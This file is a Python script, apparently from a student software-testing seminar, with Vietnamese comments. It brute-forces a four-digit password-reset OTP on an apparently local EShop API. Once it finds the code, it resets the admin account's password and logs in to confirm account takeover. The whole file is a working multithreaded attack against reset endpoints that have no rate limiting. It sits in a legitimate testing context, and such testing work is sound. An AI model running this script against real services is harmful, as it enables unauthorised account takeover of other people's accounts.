#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
========================================================================================
SUT SECURITY TEST - OWASP A07:2021 (Identification and Authentication Failures)
Brute-force OTP Password Reset Automation Script
Phụ trách: Lê Chí Hoàng Long (MSSV: 23120294) - Seminar Software Testing FIT@HCMUS
========================================================================================
Lỗ hổng mục tiêu:
- Endpoint: POST /api/forgot-password & POST /api/reset-password
- Cơ chế yếu: Mã OTP chỉ gồm 4 chữ số (1000 - 9999, không gian 9000 giá trị)
- Thiếu hụt: Hoàn toàn không có Rate Limiting, không giới hạn số lần thử, không khóa tạm thời
- Hậu quả: Cho phép kẻ tấn công vét cạn OTP trong vài giây và chiếm quyền tài khoản (ATO - Account Takeover)
- Ánh xạ CWE: CWE-307 (Improper Restriction of Excessive Authentication Attempts)
              CWE-640 (Weak Password Recovery Mechanism for Forgotten Password)
              CWE-330 (Use of Insufficiently Random Values)
Tích hợp quy trình nhóm (DevSecOps Toolchain):
- Nhận file raw HTTP request (`reset_password.req`) từ OWASP ZAP do Vũ Quốc Hùng xuất.
- Tự động phân tích headers, path, host và nạp payload brute-force OTP.
========================================================================================
"""

import sys
import os
import time
import json
import logging
import argparse
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib.request
import urllib.error

# Thiết lập logging
logger = logging.getLogger("BruteForceOTP")

class OTPBruteForcer:
    def __init__(self, base_url="http://localhost:3000", target_email="admin@eshop.com",
                 new_password="PwnedAdmin2026!", start_otp=1000, end_otp=9999,
                 threads=25, log_file="brute_force_otp.log", raw_req_file=None):
        self.base_url = base_url.rstrip("/")
        self.target_email = target_email
        self.new_password = new_password
        self.start_otp = start_otp
        self.end_otp = end_otp
        self.max_threads = threads
        self.log_file = log_file
        self.raw_req_file = raw_req_file

        self.reset_path = "/api/reset-password"
        self.custom_headers = {"Content-Type": "application/json"}
        self.body_template = None

        self.stop_event = threading.Event()
        self.found_otp = None
        self.attempts_count = 0
        self.lock = threading.Lock()
        self.start_time = None
        self.end_time = None

        self._setup_logger()
        if self.raw_req_file:
            self._parse_raw_request(self.raw_req_file)

    def _setup_logger(self):
        logger.setLevel(logging.INFO)
        formatter = logging.Formatter("[%(asctime)s] [%(levelname)s] %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
        
        # File handler
        fh = logging.FileHandler(self.log_file, mode="w", encoding="utf-8")
        fh.setFormatter(formatter)
        logger.addHandler(fh)

        # Stream handler
        sh = logging.StreamHandler(sys.stdout)
        sh.setFormatter(formatter)
        logger.addHandler(sh)

    def _parse_raw_request(self, file_path):
        """Phân tích tệp raw HTTP request (reset_password.req) xuất từ OWASP ZAP (Hùng phụ trách)."""
        if not os.path.isfile(file_path):
            logger.warning(f"[!] File raw request '{file_path}' chưa tồn tại. Sẽ sử dụng cấu hình endpoint mặc định.")
            return

        try:
            with open(file_path, "r", encoding="utf-8") as f:
                raw_text = f.read()

            parts = raw_text.split("\n\n", 1)
            if len(parts) < 2:
                parts = raw_text.split("\r\n\r\n", 1)

            headers_raw = parts[0].strip().splitlines()
            first_line = headers_raw[0].split()
            if len(first_line) >= 2:
                raw_path = first_line[1]
                if raw_path.startswith("http://") or raw_path.startswith("https://"):
                    from urllib.parse import urlparse
                    parsed = urlparse(raw_path)
                    self.base_url = f"{parsed.scheme}://{parsed.netloc}"
                    self.reset_path = parsed.path
                else:
                    self.reset_path = raw_path

            headers = {}
            for line in headers_raw[1:]:
                if ":" in line:
                    k, v = line.split(":", 1)
                    k_str = k.strip()
                    v_str = v.strip()
                    if k_str.lower() == "host":
                        self.base_url = f"http://{v_str}"
                    elif k_str.lower() not in ("content-length", "connection"):
                        headers[k_str] = v_str

            if "Content-Type" not in headers:
                headers["Content-Type"] = "application/json"
            self.custom_headers = headers

            if len(parts) > 1 and parts[1].strip():
                self.body_template = parts[1].strip()

            logger.info(f"[+] [Record & Playback] Đã nạp thành công raw HTTP request từ ZAP: {file_path}")
            logger.info(f"    Target Endpoint: POST {self.base_url}{self.reset_path}")
        except Exception as e:
            logger.warning(f"[!] Lỗi khi đọc file raw request {file_path}: {e}. Dùng cấu hình mặc định.")

    def trigger_forgot_password(self):
        """Khởi tạo yêu cầu quên mật khẩu để server tạo mã OTP 4 số."""
        url = f"{self.base_url}/api/forgot-password"
        payload = json.dumps({"email": self.target_email}).encode("utf-8")
        headers = {"Content-Type": "application/json"}

        logger.info(f"[*] [Giai đoạn 1] Khởi tạo yêu cầu đặt lại mật khẩu cho: {self.target_email}")
        logger.info(f"    Target: POST {url}")

        req = urllib.request.Request(url, data=payload, headers=headers, method="POST")
        try:
            with urllib.request.urlopen(req, timeout=10) as resp:
                data = json.loads(resp.read().decode("utf-8"))
                logger.info(f"[✔] Server phản hồi: {data.get('message', 'Thành công')}")
                if "resetToken" in data:
                    logger.info(f"    [Thông tin kiểm chứng SUT] Server đã sinh OTP cho tài khoản: {data['resetToken']}")
                return True
        except urllib.error.HTTPError as e:
            err_body = e.read().decode("utf-8", errors="ignore")
            logger.error(f"[!] Gửi forgot-password thất bại (HTTP {e.code}): {err_body}")
            return False
        except Exception as e:
            logger.error(f"[!] Không thể kết nối tới máy chủ {url}: {e}")
            return False

    def _send_reset_request(self, otp):
        """Gửi gói tin thử một mã OTP cụ thể."""
        if self.stop_event.is_set():
            return None

        url = f"{self.base_url}{self.reset_path}"
        payload = json.dumps({
            "email": self.target_email,
            "resetToken": str(otp),
            "newPassword": self.new_password
        }).encode("utf-8")

        with self.lock:
            self.attempts_count += 1
            current_attempt = self.attempts_count
            if current_attempt % 500 == 0 or current_attempt == 1:
                logger.info(f"[*] Tiến độ vét cạn: Đã gửi {current_attempt} requests... Đang thử OTP ~ {otp}")

        req = urllib.request.Request(url, data=payload, headers=self.custom_headers, method="POST")
        try:
            with urllib.request.urlopen(req, timeout=5) as resp:
                if resp.status == 200:
                    data = json.loads(resp.read().decode("utf-8"))
                    self.found_otp = otp
                    self.stop_event.set()
                    logger.info(f"[★★★] TẤN CÔNG THÀNH CÔNG! ĐÃ TÌM THẤY OTP CHÍNH XÁC: {otp}")
                    logger.info(f"      Phản hồi: {data.get('message', 'Password reset successfully')}")
                    return otp
        except urllib.error.HTTPError as e:
            # 400 Bad Request: Invalid token or email -> OTP sai, tiếp tục
            if e.code == 400:
                return None
            else:
                pass
        except Exception:
            pass
        return None

    def run_brute_force(self):
        """Thực thi tấn công đa luồng vét cạn không gian OTP 1000 - 9999."""
        logger.info("=" * 80)
        logger.info(" BẮT ĐẦU TẤN CÔNG VÉT CẠN OTP (A07 - Authentication Failures)")
        logger.info(f" Mục tiêu: {self.target_email} | Dải OTP: [{self.start_otp} - {self.end_otp}]")
        logger.info(f" Không gian tìm kiếm: {self.end_otp - self.start_otp + 1} mã khả dĩ")
        logger.info(f" Số luồng tấn công song song: {self.max_threads}")
        if self.raw_req_file and os.path.isfile(self.raw_req_file):
            logger.info(f" Nạp raw request: {self.raw_req_file}")
        logger.info("=" * 80)

        self.start_time = time.time()
        otp_list = list(range(self.start_otp, self.end_otp + 1))

        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = [executor.submit(self._send_reset_request, otp) for otp in otp_list]
            for future in as_completed(futures):
                if self.stop_event.is_set():
                    break

        self.end_time = time.time()
        elapsed = self.end_time - self.start_time
        speed = self.attempts_count / elapsed if elapsed > 0 else 0

        logger.info("-" * 80)
        if self.found_otp:
            logger.info(f"[✔] KẾT QUẢ: Tấn công THÀNH CÔNG!")
            logger.info(f"    - Mã OTP giải mã thành công: {self.found_otp}")
            logger.info(f"    - Số lượt requests đã thử: {self.attempts_count}")
            logger.info(f"    - Thời gian thực thi: {elapsed:.2f} giây")
            logger.info(f"    - Tốc độ vét cạn trung bình: {speed:.1f} requests/giây")
            logger.info(f"    - Mật khẩu mới được thiết lập: {self.new_password}")
            
            # Giai đoạn 3: Xác minh đăng nhập chiếm quyền tài khoản (Account Takeover)
            self.verify_account_takeover()
        else:
            logger.warning(f"[!] Không tìm thấy OTP trong dải đã quét ({self.start_otp} - {self.end_otp}).")
            logger.info(f"    - Số requests đã gửi: {self.attempts_count}")
            logger.info(f"    - Thời gian: {elapsed:.2f}s")
        logger.info("-" * 80)

    def verify_account_takeover(self):
        """Đăng nhập bằng mật khẩu mới để chứng minh đã chiếm quyền hoàn toàn."""
        url = f"{self.base_url}/api/login"
        payload = json.dumps({
            "email": self.target_email,
            "password": self.new_password
        }).encode("utf-8")
        headers = {"Content-Type": "application/json"}

        logger.info(f"[*] [Giai đoạn 3] Kiểm chứng chiếm quyền tài khoản (Account Takeover Verification)")
        logger.info(f"    Target: POST {url} với mật khẩu mới: {self.new_password}")

        req = urllib.request.Request(url, data=payload, headers=headers, method="POST")
        try:
            with urllib.request.urlopen(req, timeout=5) as resp:
                if resp.status == 200:
                    data = json.loads(resp.read().decode("utf-8"))
                    token = data.get("token", "")
                    user = data.get("user", {})
                    logger.info(f"[✔] ĐĂNG NHẬP THÀNH CÔNG! CHIẾM QUYỀN TÀI KHOẢN HOÀN TẤT!")
                    logger.info(f"    - User ID: {user.get('id')} | Email: {user.get('email')} | Role: {user.get('role')}")
                    logger.info(f"    - JWT Token trích xuất: {token[:40]}... (Độ dài: {len(token)} chars)")
                    return True
        except Exception as e:
            logger.error(f"[!] Đăng nhập kiểm chứng thất bại: {e}")
            return False

def main():
    parser = argparse.ArgumentParser(description="Script tấn công vét cạn OTP 4 số (OWASP A07:2021)")
    parser.add_argument("-r", "--request", default=None, help="Đường dẫn file raw HTTP request (reset_password.req) xuất từ OWASP ZAP")
    parser.add_argument("--url", default="http://localhost:3000", help="Địa chỉ gốc của EShop API (mặc định: http://localhost:3000)")
    parser.add_argument("--email", default="admin@eshop.com", help="Email mục tiêu (mặc định: admin@eshop.com)")
    parser.add_argument("--new-pass", default="PwnedAdmin2026!", help="Mật khẩu mới thay thế (mặc định: PwnedAdmin2026!)")
    parser.add_argument("--start", type=int, default=1000, help="OTP bắt đầu (mặc định: 1000)")
    parser.add_argument("--end", type=int, default=9999, help="OTP kết thúc (mặc định: 9999)")
    parser.add_argument("--threads", type=int, default=30, help="Số luồng gửi requests song song (mặc định: 30)")
    parser.add_argument("--log", default="demo/brute_force_otp/brute_force_otp.log", help="Tệp lưu log kết quả")
    parser.add_argument("--skip-trigger", action="store_true", help="Bỏ qua bước gọi forgot-password nếu đã gọi trước đó")
    args = parser.parse_args()

    # Tự động tìm reset_password.req / reset_password.raw nếu có sẵn trong thư mục
    req_file = args.request
    if not req_file:
        for candidate in ["alert/reset_password.raw", "reset_password.req", "demo/brute_force_otp/reset_password.req"]:
            if os.path.isfile(candidate):
                req_file = candidate
                break

    attacker = OTPBruteForcer(
        base_url=args.url,
        target_email=args.email,
        new_password=args.new_pass,
        start_otp=args.start,
        end_otp=args.end,
        threads=args.threads,
        log_file=args.log,
        raw_req_file=req_file
    )

    if not args.skip_trigger:
        ok = attacker.trigger_forgot_password()
        if not ok:
            logger.error("[!] Khởi tạo forgot-password thất bại. Vui lòng kiểm tra máy chủ backend đang chạy.")
            sys.exit(1)
        time.sleep(1)

    attacker.run_brute_force()

if __name__ == "__main__":
    main()
